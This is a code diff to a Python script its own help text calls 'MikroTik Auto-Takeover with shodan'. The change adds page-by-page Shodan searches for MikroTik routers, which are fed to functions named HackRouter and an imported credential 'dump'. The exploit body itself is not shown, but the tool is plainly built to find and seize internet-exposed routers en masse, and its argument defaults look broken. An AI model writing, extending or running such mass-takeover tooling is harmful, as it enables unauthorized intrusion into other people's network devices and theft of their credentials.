@@ -4,9 +4,9 @@ import socket
 import sys
 from extract_user import dump
 
-def searchShodan(api):
+def searchShodan(api,pagenum):
 	try:
-		extracted = api.search('mikrotik')
+		extracted = api.search('mikrotik', page=pagenum)
 	except shodan.APIError:
 		print('Error')
 	for result in extracted['matches']:
@@ -62,9 +62,11 @@ def HackRouter(ip):
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description='MikroTik Auto-Takeover with shodan')
 	parser.add_argument('-k', action ='store', dest='key', help="Shodan Key",default=max)
+	parser.add_argument('-p', action ='store',type=int, dest='pagec', help="Page count",default=max)
 	results = parser.parse_args()
 	if results.key != None:
 		key = results.key
 		api = shodan.Shodan(key)
-		searchShodan(api)
+		for x in range(results.pagec):
+			searchShodan(api,x)
 		
